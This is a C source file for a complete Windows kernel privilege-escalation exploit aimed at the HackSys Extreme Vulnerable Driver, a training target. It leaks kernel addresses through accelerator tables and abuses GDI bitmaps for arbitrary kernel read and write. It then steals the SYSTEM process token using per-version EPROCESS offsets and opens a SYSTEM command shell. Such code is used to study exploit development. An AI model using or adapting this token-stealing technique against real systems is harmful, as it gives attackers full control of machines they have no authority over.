#include <windows.h>
#include <stdio.h>
#include <sddl.h>
#include "HS-ArbitraryOverwriteGDI.h"


LONG BitmapArbitraryRead(HBITMAP hManager, HBITMAP hWorker, LPVOID lpReadAddress, LPVOID lpReadResult, DWORD dwReadLen)
{
	SetBitmapBits(hManager, dwReadLen, &lpReadAddress);		// Set Workers pvScan0 to the Address we want to read. 
	return GetBitmapBits(hWorker, dwReadLen, lpReadResult); // Use Worker to Read result into lpReadResult Pointer.
}


LONG BitmapArbitraryWrite(HBITMAP hManager, HBITMAP hWorker, LPVOID lpWriteAddress, LPVOID lpWriteValue, DWORD dwWriteLen)
{
	SetBitmapBits(hManager, dwWriteLen, &lpWriteAddress);     // Set Workers pvScan0 to the Address we want to write.
	return SetBitmapBits(hWorker, dwWriteLen, &lpWriteValue); // Use Worker to Write at Arbitrary Kernel address.
}


LeakBitmapInfo GDIReloaded(LPCWSTR lpBitmapName, DWORD dwOffsetToPvScan0)
{
	LeakBitmapInfo BitmapInfo;
	DWORD dwCounter = 0;
	HACCEL hAccel;							// Handle to Accelerator table 
	LPACCEL lpAccel;						// Pointer to Accelerator table Array
	PUSER_HANDLE_ENTRY AddressA = NULL;
	PUSER_HANDLE_ENTRY AddressB = NULL;
	PUCHAR pAcceleratorAddrA = NULL;
	PUCHAR pAcceleratorAddrB = NULL;

	PSHAREDINFO pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandle(L"user32.dll"), "gSharedInfo");
	PUSER_HANDLE_ENTRY gHandleTable = pSharedInfo->aheList;
	DWORD index;

	// Allocate Memory for the Accelerator Array
	lpAccel = (LPACCEL)LocalAlloc(LPTR, sizeof(ACCEL) * 700);

	wprintf(L" [*] Creating and Freeing AcceleratorTables");

	while (dwCounter < 20) {
		hAccel = CreateAcceleratorTable(lpAccel, 700);
		index = LOWORD(hAccel);
		AddressA = &gHandleTable[index];
		pAcceleratorAddrA = (PUCHAR)AddressA->pKernel;
		DestroyAcceleratorTable(hAccel);

		hAccel = CreateAcceleratorTable(lpAccel, 700);
		index = LOWORD(hAccel);
		AddressB = &gHandleTable[index];
		pAcceleratorAddrB = (PUCHAR)AddressB->pKernel;

		if (pAcceleratorAddrA == pAcceleratorAddrB) {
			BitmapInfo.pThreadInfo = AddressA->pti;		// Leak Current _THREADINFO Structure
			DestroyAcceleratorTable(hAccel);
			LPVOID lpBuf = VirtualAlloc(NULL, 0x50 * 2 * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			BitmapInfo.hBitmap = CreateBitmap(0x701, 2, 1, 8, lpBuf);
			break;
		}
		DestroyAcceleratorTable(hAccel);
		dwCounter++;
	}

	wprintf(L" -> Done!\n");

	BitmapInfo.pBitmapPvScan0 = pAcceleratorAddrA + dwOffsetToPvScan0;
	wprintf(L" [+] Duplicate AcceleratorTable Address: 0x%p \n", pAcceleratorAddrA);
	wprintf(L" [+] %ls Bitmap Handle at: 0x%08x \n", lpBitmapName, (ULONG)BitmapInfo.hBitmap);
	wprintf(L" [+] %ls Bitmap pvScan0 Pointer: 0x%p \n\n", lpBitmapName, BitmapInfo.pBitmapPvScan0);

	return BitmapInfo;
}


BOOL IsSystem(VOID)
{
	DWORD dwSize = 0, dwResult = 0;
	HANDLE hToken = NULL;
	PTOKEN_USER Ptoken_User;
	LPWSTR SID = NULL;

	// Open a handle to the access token for the calling process.
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	// Call GetTokenInformation to get the buffer size.
	if (!GetTokenInformation(hToken, TokenUser, NULL, dwSize, &dwSize)) {
		dwResult = GetLastError();
		if (dwResult != ERROR_INSUFFICIENT_BUFFER) {
			return FALSE;
		}
	}

	// Allocate the buffer.
	Ptoken_User = (PTOKEN_USER)GlobalAlloc(GPTR, dwSize);

	// Call GetTokenInformation again to get the group information.
	if (!GetTokenInformation(hToken, TokenUser, Ptoken_User, dwSize, &dwSize)) {
		return FALSE;
	}
	if (!ConvertSidToStringSidW(Ptoken_User->User.Sid, &SID)) {
		return FALSE;
	}

	if (_wcsicmp(L"S-1-5-18", SID) != 0) {
		return FALSE;
	}
	if (Ptoken_User) GlobalFree(Ptoken_User);

	return TRUE;
}


void PopShell()
{
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}


int wmain(int argc, wchar_t* argv[])
{
	OSVERSIONINFOEXW osInfo;
	LPVOID lpSourceTargetAddress = NULL;
	LeakBitmapInfo ManagerBitmap;
	LeakBitmapInfo WorkerBitmap;
	HANDLE hDevice;
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	BOOL bResult = FALSE;
	PUCHAR chOverwriteBuffer;


	wprintf(L"    __ __         __    ____       	\n");
	wprintf(L"   / // /__ _____/ /__ / __/_ _____	\n");
	wprintf(L"  / _  / _ `/ __/  '_/_\\ \\/ // (_-<	\n");
	wprintf(L" /_//_/\\_,_/\\__/_/\\_\\/___/\\_, /___/	\n");
	wprintf(L"                         /___/     	\n");
	wprintf(L"					\n");
	wprintf(L"	 Extreme Vulnerable Driver  \n");
	wprintf(L"	Arbitrary Overwrite using GDI \n\n");

	
	// Set OS Version/Architecture specific values/offsets 
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	_RtlGetVersion RtlGetVersion = (_RtlGetVersion)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlGetVersion");
	if (RtlGetVersion == NULL) {
		wprintf(L" -> Unable to get Module handle!\n\n");
		exit(1);
	}

	RtlGetVersion(&osInfo);
 
	LPWSTR lpOSArch;
	TCHAR chOSMajorMinor[8];
	LPWSTR lpOSVersion;
	DWORD dwOffsetToPvScan0;
	DWORD dwUniqueProcessIdOffset;
	DWORD dwTokenOffset;
	DWORD dwActiveProcessLinks;

	swprintf_s(chOSMajorMinor, sizeof(chOSMajorMinor), L"%u.%u", osInfo.dwMajorVersion, osInfo.dwMinorVersion);

	if (sizeof(LPVOID) == 4) {
		lpOSArch = L"x86";
		dwOffsetToPvScan0 = 0x30;
		if (_wcsicmp(chOSMajorMinor, L"10.0") == 0) {
			lpOSVersion = L"10 or Server 2016";
			dwUniqueProcessIdOffset = 0xb4;
			dwTokenOffset = 0xf4;
			dwActiveProcessLinks = 0xb8;
		}
		else if (_wcsicmp(chOSMajorMinor, L"6.3") == 0) {
			lpOSVersion = L"8.1 or Server 2012R2";
			dwUniqueProcessIdOffset = 0xb4;
			dwTokenOffset = 0xec;
			dwActiveProcessLinks = 0xb8;
		}
		else if (_wcsicmp(chOSMajorMinor, L"6.2") == 0) {
			lpOSVersion = L"8 or Server 2012";
			dwUniqueProcessIdOffset = 0xb4;
			dwTokenOffset = 0xec;
			dwActiveProcessLinks = 0xb8;
		}
		else if (_wcsicmp(chOSMajorMinor, L"6.1") == 0) {
			lpOSVersion = L"7 or Server 2008R2";
			dwUniqueProcessIdOffset = 0xb4;
			dwTokenOffset = 0xf8;
			dwActiveProcessLinks = 0xb8;
		}
		else {
			wprintf(L" [!] OS Version not supported.\n\n");
			exit(1);
		}
	}
	else
	{
		lpOSArch = L"x64";
		dwOffsetToPvScan0 = 0x50;
		if (_wcsicmp(chOSMajorMinor, L"10.0") == 0) {
			lpOSVersion = L"10 or Server 2016";
			dwUniqueProcessIdOffset = 0x2e8;
			dwTokenOffset = 0x358;
			dwActiveProcessLinks = 0x2f0;
		}
		else if (_wcsicmp(chOSMajorMinor, L"6.3") == 0) {
			lpOSVersion = L"8.1 or Server 2012R2";
			dwUniqueProcessIdOffset = 0x2e0;
			dwTokenOffset = 0x348;
			dwActiveProcessLinks = 0x2e8;
		}
		else if (_wcsicmp(chOSMajorMinor, L"6.2") == 0) {
			lpOSVersion = L"8 or Server 2012";
			dwUniqueProcessIdOffset = 0x2e0;
			dwTokenOffset = 0x348;
			dwActiveProcessLinks = 0x2e8;
		}
		else if (_wcsicmp(chOSMajorMinor, L"6.1") == 0) {
			lpOSVersion = L"7 or Server 2008R2";
			dwUniqueProcessIdOffset = 0x180;
			dwTokenOffset = 0x208;
			dwActiveProcessLinks = 0x188;
		}
		else {
			wprintf(L" [!] OS Version not supported.\n\n");
			exit(1);
		}
	}
	
	wprintf(L" [*] Exploit running on Windows Version: %ls %ls build %u \n\n", lpOSVersion, lpOSArch, osInfo.dwBuildNumber);
	
	// Creating and Freeing AcceleratorTables and lookup pvScan0 addresses
	ManagerBitmap = GDIReloaded(L"Manager", dwOffsetToPvScan0);
	WorkerBitmap = GDIReloaded(L"Worker", dwOffsetToPvScan0);


	wprintf(L" [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);											// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Prepare our Arbitrary Overwrite Buffer");

	// Create a double Pointer to pWorkerPvScan0
	lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	lpSourceTargetAddress = &WorkerBitmap.pBitmapPvScan0;

	chOverwriteBuffer = (PUCHAR)malloc(sizeof(LPVOID) * 2);
	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, (sizeof(LPVOID)));
	memcpy(chOverwriteBuffer + (sizeof(LPVOID)), &ManagerBitmap.pBitmapPvScan0, (sizeof(LPVOID)));

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Overwrite Buffer is available at: 0x%p \n\n", chOverwriteBuffer);

	wprintf(L" [*] Lets send our Arbitrary Buffer to the Driver");

	DWORD junk = 0;                     // Discard results

	bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x22200B,						// Operation to perform
		chOverwriteBuffer,				// Input Buffer		
		(sizeof(LPVOID) * 2),			// Buffer Size
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL);			// Synchronous I/O	
	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	CloseHandle(hDevice);

	wprintf(L" -> Done!\n\n");

	// Use BitmapArbitraryRead() to find Current Process Token using Leaked _THREADINFO Structure
	wprintf(L" [*] Reading Leaked _THREADINFO Structure");

	LPVOID lpCurrentEPROCESS = NULL;
	DWORD dwCurrentPID = 0;
	LPVOID lpCurrentToken = NULL;
	LIST_ENTRY leNextProcessLink;
	
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, ManagerBitmap.pThreadInfo, &lpCurrentEPROCESS, sizeof(LPVOID));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpCurrentEPROCESS + dwUniqueProcessIdOffset, &dwCurrentPID, sizeof(LPVOID));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpCurrentEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));
	BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpCurrentEPROCESS + dwTokenOffset, &lpCurrentToken, sizeof(LPVOID));

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Current _EPROCESS Structure is at: 0x%p \n", lpCurrentEPROCESS);
	wprintf(L" [+] Current Process ID is: %d \n", dwCurrentPID);
	wprintf(L" [+] Current _EPROCESS Token address is at: 0x%p \n", (PUCHAR)lpCurrentEPROCESS + dwTokenOffset);
	wprintf(L" [+] Current Process Token is: 0x%p \n\n", lpCurrentToken);

	// Use BitmapArbitraryRead() to read System Token and replace the Current user Token
	wprintf(L" [*] Reading System _EPROCESS structure");
	
	LPVOID lpNextEPROCESS = NULL;
	LPVOID lpSystemPID = NULL;
	LPVOID lpSystemToken = NULL;
	DWORD dwSystemPID = 0;
	do {
		lpNextEPROCESS = (PUCHAR)leNextProcessLink.Flink - dwActiveProcessLinks;
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwUniqueProcessIdOffset, &lpSystemPID, sizeof(LPVOID));
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwTokenOffset, &lpSystemToken, sizeof(LPVOID));

		// Read _LIST_ENTRY to next Active _EPROCESS Structure
		BitmapArbitraryRead(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpNextEPROCESS + dwActiveProcessLinks, &leNextProcessLink, sizeof(LIST_ENTRY));

		dwSystemPID = LOWORD(lpSystemPID);

	} while (dwSystemPID != 0x4);

	wprintf(L" -> Done!\n");
	wprintf(L" [+] System _EPROCESS Structure is at: 0x%p \n", lpNextEPROCESS);
	wprintf(L" [+] System Process ID is: %u \n", dwSystemPID);
	wprintf(L" [+] System _EPROCESS Token address is at: 0x%p \n", (PUCHAR)lpNextEPROCESS + dwTokenOffset);
	wprintf(L" [+] System Process Token is: 0x%p \n\n", lpSystemToken);

	wprintf(L" [*] Replace Current Token");

	BitmapArbitraryWrite(ManagerBitmap.hBitmap, WorkerBitmap.hBitmap, (PUCHAR)lpCurrentEPROCESS + dwTokenOffset, lpSystemToken, sizeof(LPVOID));

	wprintf(L" -> Done!\n\n");

	BOOL isGodMode = IsSystem();
	if (!isGodMode) {
		wprintf(L" [!] Exploit Failed :( \n\n");
		exit(1);
	}

	PopShell();
	wprintf(L" [!] Enjoy your Shell and Thank You for Flying Ring0 Airways ;) \n\n");

	return (0);

}